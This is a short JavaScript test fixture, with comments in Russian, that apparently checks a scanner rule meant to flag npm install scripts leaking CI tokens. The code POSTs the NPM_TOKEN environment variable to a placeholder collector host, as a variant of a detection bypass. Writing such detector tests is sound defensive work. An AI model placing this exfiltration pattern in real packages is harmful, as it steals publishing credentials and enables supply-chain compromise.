// Тот же обход, что в req-var-write.js, но тело уходит вызовом .end(...).
// Ожидается ERROR install-script-ci-token-exfil.
const https = require('https');
const req = https.request({ hostname: 'collector.example.invalid', path: '/c', method: 'POST' });

req.end(process.env.NPM_TOKEN);
